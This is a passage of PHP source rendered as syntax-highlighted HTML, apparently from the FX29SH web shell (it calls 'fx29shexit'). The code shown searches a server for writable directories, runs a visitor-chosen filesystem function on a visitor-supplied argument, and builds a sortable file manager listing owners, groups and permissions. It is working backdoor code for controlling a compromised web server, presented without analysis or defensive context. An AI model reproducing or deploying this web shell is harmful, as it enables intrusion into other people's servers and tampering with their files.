<span class="s2">                echo &quot;</span><span class="p">[</span><span class="s2">&quot;.</span><span class="si">$dir_count</span><span class="s2">.&quot;</span><span class="p">]</span> <span class="s2">&quot;.</span><span class="si">$dir</span><span class="s2">.</span><span class="si">$entry</span><span class="s2">.&quot;</span><span class="nx">\n</span><span class="s2">&quot;;</span>
<span class="s2">                recurse_dir(</span><span class="si">$dir</span><span class="s2">.</span><span class="si">$entry</span><span class="s2">.DIRECTORY_SEPARATOR,</span><span class="si">$max_dir</span><span class="s2">);</span>
<span class="s2">              }</span>
<span class="s2">            }</span>
<span class="s2">          }</span>
<span class="s2">          </span><span class="si">$cdir</span><span class="s2">-&amp;gt;close();</span>
<span class="s2">        }</span>
<span class="s2">      }</span>
<span class="s2">      if (!</span><span class="si">$arg1</span><span class="s2">) { </span><span class="si">$arg1</span><span class="s2"> = </span><span class="si">$d</span><span class="s2">; }</span>
<span class="s2">      if (!</span><span class="si">$arg2</span><span class="s2">) { </span><span class="si">$arg2</span><span class="s2"> = 10; }</span>
<span class="s2">      if (is_dir(</span><span class="si">$arg1</span><span class="s2">)) {</span>
<span class="s2">        echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Writable</span> <span class="nx">directories</span> <span class="p">(</span><span class="nx">Max</span><span class="o">:</span> <span class="nv">$arg2</span><span class="p">)</span> <span class="nx">in</span><span class="o">:&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$arg1</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">hr</span> <span class="nx">noshade</span> <span class="nx">size</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">        echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">pre</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">        recurse_dir(</span><span class="si">$arg1</span><span class="s2">,</span><span class="si">$arg2</span><span class="s2">);</span>
<span class="s2">        echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">pre</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">        </span><span class="si">$total</span><span class="s2"> = </span><span class="si">$dir_count</span><span class="s2"> - 1;</span>
<span class="s2">        echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">hr</span> <span class="nx">noshade</span> <span class="nx">size</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Founds</span><span class="o">:&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;.</span><span class="si">$total</span><span class="s2">.&quot;</span> <span class="nx">of</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Max</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$arg2</span><span class="s2">&quot;;</span>
<span class="s2">      }</span>
<span class="s2">      else {</span>
<span class="s2">        disp_error(&quot;</span><span class="nx">Directory</span> <span class="nx">is</span> <span class="k">not</span> <span class="nx">exists</span> <span class="k">or</span> <span class="nx">permission</span> <span class="nx">denied</span><span class="o">!</span><span class="s2">&quot;);</span>
<span class="s2">      }</span>
<span class="s2">    }</span>
<span class="s2">    else {</span>
<span class="s2">      if (!</span><span class="si">$arg1</span><span class="s2">) { disp_error(&quot;</span><span class="nx">No</span> <span class="nx">operation</span><span class="o">!</span> <span class="nx">Please</span> <span class="nx">fill</span> <span class="mi">1</span><span class="nx">st</span> <span class="nx">parameter</span><span class="o">!</span><span class="s2">&quot;); }</span>
<span class="s2">      else {</span>
<span class="s2">        if (</span><span class="si">$hasil</span><span class="s2"> = </span><span class="si">$fsfunc</span><span class="s2">(</span><span class="si">$arg1</span><span class="s2">)) {</span>
<span class="s2">          echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Result</span> <span class="nx">of</span> <span class="nv">$fsfunc</span> <span class="nv">$arg1</span><span class="o">:&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">          if (!is_array(</span><span class="si">$hasil</span><span class="s2">)) { echo &quot;</span><span class="nv">$hasil\n</span><span class="s2">&quot;; }</span>
<span class="s2">          else {</span>
<span class="s2">            echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">pre</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">            foreach (</span><span class="si">$hasil</span><span class="s2"> as </span><span class="si">$v</span><span class="s2">) { echo </span><span class="si">$v</span><span class="s2">.&quot;</span><span class="nx">\n</span><span class="s2">&quot;; }</span>
<span class="s2">            echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">pre</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">          }</span>
<span class="s2">        }</span>
<span class="s2">        else { disp_error(&quot;</span><span class="nv">$fsfunc</span> <span class="nv">$arg1</span> <span class="nx">failed</span><span class="o">!</span><span class="s2">&quot;); }</span>
<span class="s2">      }</span>
<span class="s2">    }</span>
<span class="s2">    echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">div</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">\n</span><span class="s2">&quot;;</span>
<span class="s2">  }</span>
<span class="s2">  ###[ DIRECTORY LIST ]###</span>
<span class="s2">  if (</span><span class="si">$act</span><span class="s2"> == &quot;</span><span class="nx">ls</span><span class="s2">&quot;) {</span>
<span class="s2">    if (count(</span><span class="si">$ls_arr</span><span class="s2">) &amp;gt; 0) { </span><span class="si">$list</span><span class="s2"> = </span><span class="si">$ls_arr</span><span class="s2">; }</span>
<span class="s2">    else {</span>
<span class="s2">      </span><span class="si">$list</span><span class="s2"> = array();</span>
<span class="s2">      if (</span><span class="si">$h</span><span class="s2"> = @opendir(</span><span class="si">$d</span><span class="s2">)) {</span>
<span class="s2">        while ((</span><span class="si">$o</span><span class="s2"> = readdir(</span><span class="si">$h</span><span class="s2">)) !== FALSE) { </span><span class="si">$list</span><span class="s2">[] = </span><span class="si">$d</span><span class="s2">.</span><span class="si">$o</span><span class="s2">; }</span>
<span class="s2">        closedir(</span><span class="si">$h</span><span class="s2">);</span>
<span class="s2">      }</span>
<span class="s2">    }</span>
<span class="s2">    if (count(</span><span class="si">$list</span><span class="s2">) == 0) {</span>
<span class="s2">      disp_error(&quot;</span><span class="nx">No</span> <span class="nx">such</span> <span class="nx">directory</span> <span class="k">or</span> <span class="nx">access</span> <span class="nx">denied</span><span class="o">!&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.htmlspecialchars(</span><span class="si">$d</span><span class="s2">));</span>
<span class="s2">    }</span>
<span class="s2">    else {</span>
<span class="s2">      </span><span class="si">$objects</span><span class="s2"> = array();</span>
<span class="s2">      </span><span class="si">$vd</span><span class="s2"> = &quot;</span><span class="nx">f</span><span class="s2">&quot;; #Viewing mode</span>
<span class="s2">      if (</span><span class="si">$vd</span><span class="s2"> == &quot;</span><span class="nx">f</span><span class="s2">&quot;) {</span>
<span class="s2">        </span><span class="si">$objects[&quot;head&quot;]</span><span class="s2"> = array();</span>
<span class="s2">        </span><span class="si">$objects[&quot;folders&quot;]</span><span class="s2"> = array();</span>
<span class="s2">        </span><span class="si">$objects[&quot;links&quot;]</span><span class="s2"> = array();</span>
<span class="s2">        </span><span class="si">$objects[&quot;files&quot;]</span><span class="s2"> = array();</span>
<span class="s2">        foreach (</span><span class="si">$list</span><span class="s2"> as </span><span class="si">$v</span><span class="s2">) {</span>
<span class="s2">          </span><span class="si">$o</span><span class="s2"> = basename(</span><span class="si">$v</span><span class="s2">);</span>
<span class="s2">          </span><span class="si">$row</span><span class="s2"> = array();</span>
<span class="s2">          if (</span><span class="si">$o</span><span class="s2"> == &quot;</span><span class="o">.</span><span class="s2">&quot;) { </span><span class="si">$row</span><span class="s2">[] = </span><span class="si">$d</span><span class="s2">.</span><span class="si">$o</span><span class="s2">; </span><span class="si">$row</span><span class="s2">[] = &quot;</span><span class="nx">CURDIR</span><span class="s2">&quot;; }</span>
<span class="s2">          elseif (</span><span class="si">$o</span><span class="s2"> == &quot;</span><span class="o">..</span><span class="s2">&quot;) { </span><span class="si">$row</span><span class="s2">[] = </span><span class="si">$d</span><span class="s2">.</span><span class="si">$o</span><span class="s2">; </span><span class="si">$row</span><span class="s2">[] = &quot;</span><span class="nx">DIR</span><span class="s2">&quot;; }</span>
<span class="s2">          elseif (is_dir(</span><span class="si">$v</span><span class="s2">)) {</span>
<span class="s2">            if (is_link(</span><span class="si">$v</span><span class="s2">)) { </span><span class="si">$type</span><span class="s2"> = &quot;</span><span class="nx">LINK</span><span class="s2">&quot;; }</span>
<span class="s2">            else { </span><span class="si">$type</span><span class="s2"> = &quot;</span><span class="nx">DIR</span><span class="s2">&quot;; }</span>
<span class="s2">            </span><span class="si">$row</span><span class="s2">[] = </span><span class="si">$v</span><span class="s2">;</span>
<span class="s2">            </span><span class="si">$row</span><span class="s2">[] = </span><span class="si">$type</span><span class="s2">;</span>
<span class="s2">          }</span>
<span class="s2">          elseif(is_file(</span><span class="si">$v</span><span class="s2">)) { </span><span class="si">$row</span><span class="s2">[] = </span><span class="si">$v</span><span class="s2">; </span><span class="si">$row</span><span class="s2">[] = filesize(</span><span class="si">$v</span><span class="s2">); }</span>
<span class="s2">          </span><span class="si">$row</span><span class="s2">[] = filemtime(</span><span class="si">$v</span><span class="s2">);</span>
<span class="s2">          if (!is_windows()) {</span>
<span class="s2">            </span><span class="si">$ow</span><span class="s2"> = posix_getpwuid(fileowner(</span><span class="si">$v</span><span class="s2">));</span>
<span class="s2">            </span><span class="si">$gr</span><span class="s2"> = posix_getgrgid(filegroup(</span><span class="si">$v</span><span class="s2">));</span>
<span class="s2">            </span><span class="si">$row</span><span class="s2">[] = (</span><span class="si">$ow[&quot;name&quot;]</span><span class="s2">?</span><span class="si">$ow[&quot;name&quot;]</span><span class="s2">:fileowner(</span><span class="si">$v</span><span class="s2">)).&quot;</span><span class="o">/</span><span class="s2">&quot;.(</span><span class="si">$gr[&quot;name&quot;]</span><span class="s2">?</span><span class="si">$gr[&quot;name&quot;]</span><span class="s2">:filegroup(</span><span class="si">$v</span><span class="s2">));</span>
<span class="s2">          }</span>
<span class="s2">          </span><span class="si">$row</span><span class="s2">[] = fileperms(</span><span class="si">$v</span><span class="s2">);</span>
<span class="s2">          if ((</span><span class="si">$o</span><span class="s2"> == &quot;</span><span class="o">.</span><span class="s2">&quot;) or (</span><span class="si">$o</span><span class="s2"> == &quot;</span><span class="o">..</span><span class="s2">&quot;)) </span><span class="si">{</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;head&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">          elseif (is_link(</span><span class="si">$v</span><span class="s2">)) { </span><span class="si">$objects[&quot;links&quot;]</span><span class="s2">[] = </span><span class="si">$row</span><span class="s2">; }</span>
<span class="s2">          elseif (is_dir(</span><span class="si">$v</span><span class="s2">)) { </span><span class="si">$objects[&quot;folders&quot;]</span><span class="s2">[] = </span><span class="si">$row</span><span class="s2">; }</span>
<span class="s2">          elseif (is_file(</span><span class="si">$v</span><span class="s2">)) { </span><span class="si">$objects[&quot;files&quot;]</span><span class="s2">[] = </span><span class="si">$row</span><span class="s2">; }</span>
<span class="s2">          </span><span class="si">$i</span><span class="s2">++;</span>
<span class="s2">        }</span>
<span class="s2">        </span><span class="si">$row</span><span class="s2"> = array();</span>
<span class="s2">        </span><span class="si">$row</span><span class="s2">[] = &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Name</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">        </span><span class="si">$row</span><span class="s2">[] = &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Size</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">        </span><span class="si">$row</span><span class="s2">[] = &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Date</span> <span class="nx">Modified</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">        if (!is_windows()) </span><span class="si">{</span><span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Owner/Group&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">        </span><span class="si">$row</span><span class="s2">[] = &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Perms</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">        </span><span class="si">$row</span><span class="s2">[] = &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Action</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">        </span><span class="si">$parsesort</span><span class="s2"> = parsesort(</span><span class="si">$sort</span><span class="s2">);</span>
<span class="s2">        </span><span class="si">$sort</span><span class="s2"> = </span><span class="si">$parsesort[0]</span><span class="s2">.</span><span class="si">$parsesort[1]</span><span class="s2">;</span>
<span class="s2">        </span><span class="si">$k</span><span class="s2"> = </span><span class="si">$parsesort[0]</span><span class="s2">;</span>
<span class="s2">        if (</span><span class="si">$parsesort[1]</span><span class="s2"> != &quot;</span><span class="nx">a</span><span class="s2">&quot;) </span><span class="si">{</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;d&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">        </span><span class="si">$y</span><span class="s2"> = &quot;</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sort=&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="p">(</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;a&quot;</span><span class="o">?</span><span class="s2">&quot;d&quot;</span><span class="o">:</span><span class="s2">&quot;a&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
        <span class="nv">$y</span> <span class="o">.=</span> <span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=sort_&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;a&quot;</span><span class="o">?</span><span class="s2">&quot;asc&quot;</span><span class="o">:</span><span class="s2">&quot;desc&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;a&quot;</span><span class="o">?</span><span class="s2">&quot;Asc&quot;</span><span class="o">:</span><span class="s2">&quot;Desc&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
        <span class="nv">$row</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">.=</span> <span class="nv">$y</span><span class="p">;</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$row</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">!=</span> <span class="nv">$k</span><span class="p">)</span> <span class="p">{</span><span class="nv">$row</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sort=&quot;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
        <span class="p">}</span>
        <span class="nv">$v</span> <span class="o">=</span> <span class="nv">$parsesort</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
        <span class="nb">usort</span><span class="p">(</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;folders&quot;</span><span class="p">],</span> <span class="s2">&quot;tabsort&quot;</span><span class="p">);</span>
        <span class="nb">usort</span><span class="p">(</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;links&quot;</span><span class="p">],</span> <span class="s2">&quot;tabsort&quot;</span><span class="p">);</span>
        <span class="nb">usort</span><span class="p">(</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;files&quot;</span><span class="p">],</span> <span class="s2">&quot;tabsort&quot;</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;d&quot;</span><span class="p">)</span> <span class="p">{</span>
          <span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;folders&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_reverse</span><span class="p">(</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;folders&quot;</span><span class="p">]);</span>
          <span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;files&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_reverse</span><span class="p">(</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;files&quot;</span><span class="p">]);</span>
        <span class="p">}</span>
        <span class="nv">$objects</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;head&quot;</span><span class="p">],</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;folders&quot;</span><span class="p">],</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;links&quot;</span><span class="p">],</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;files&quot;</span><span class="p">]);</span>
        <span class="nv">$tab</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;cols&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$row</span><span class="p">);</span>
        <span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;head&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;folders&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;links&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;files&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$objects</span> <span class="k">as</span> <span class="nv">$a</span><span class="p">)</span> <span class="p">{</span>
          <span class="nv">$v</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
          <span class="nv">$o</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
          <span class="nv">$dir</span> <span class="o">=</span> <span class="nb">dirname</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$disp_fullpath</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$disppath</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">;</span> <span class="p">}</span>
          <span class="k">else</span> <span class="p">{</span> <span class="nv">$disppath</span> <span class="o">=</span> <span class="nv">$o</span><span class="p">;</span> <span class="p">}</span>
          <span class="nv">$disppath</span> <span class="o">=</span> <span class="nx">str2mini</span><span class="p">(</span><span class="nv">$disppath</span><span class="p">,</span><span class="mi">60</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$disppath</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;strike&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$disppath</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/strike&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
          <span class="k">elseif</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$disppath</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;u&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$disppath</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/u&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
          <span class="k">foreach</span> <span class="p">(</span><span class="nv">$regxp_highlight</span> <span class="k">as</span> <span class="nv">$r</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span> <span class="nb">ereg</span><span class="p">(</span><span class="nv">$r</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span> <span class="p">)</span> <span class="p">{</span>
              <span class="k">if</span> <span class="p">((</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$r</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$r</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">3</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$r</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
                <span class="nx">disp_error</span><span class="p">(</span><span class="s2">&quot;Warning! Configuration error in </span><span class="se">\$</span><span class="s2">regxp_highlight[&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;][0] - unknown command.&quot;</span><span class="p">);</span>
                <span class="nx">fx29shexit</span><span class="p">();</span>
              <span class="p">}</span>
              <span class="k">else</span> <span class="p">{</span>
                <span class="nv">$r</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$r</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
                <span class="nv">$isdir</span> <span class="o">=</span> <span class="nb">is_dir</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">((</span><span class="nv">$r</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">or</span> <span class="p">((</span><span class="nv">$r</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="k">and</span> <span class="o">!</span><span class="nv">$isdir</span><span class="p">)</span> <span class="k">or</span> <span class="p">((</span><span class="nv">$r</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="k">and</span> <span class="o">!</span><span class="nv">$isdir</span><span class="p">))</span> <span class="p">{</span>
                  <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$r</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$r</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&quot;</span><span class="p">;</span> <span class="nv">$r</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;/b&amp;gt;&quot;</span><span class="p">;}</span>
                  <span class="nv">$disppath</span> <span class="o">=</span> <span class="nv">$r</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="nv">$disppath</span><span class="o">.</span><span class="nv">$r</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
                  <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$r</span><span class="p">[</span><span class="mi">4</span><span class="p">]))</span> <span class="p">{</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span>
                <span class="p">}</span>
              <span class="p">}</span>
            <span class="p">}</span>
          <span class="p">}</span>
          <span class="nv">$uo</span> <span class="o">=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
          <span class="nv">$ud</span> <span class="o">=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
          <span class="nv">$uv</span> <span class="o">=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
          <span class="nv">$row</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
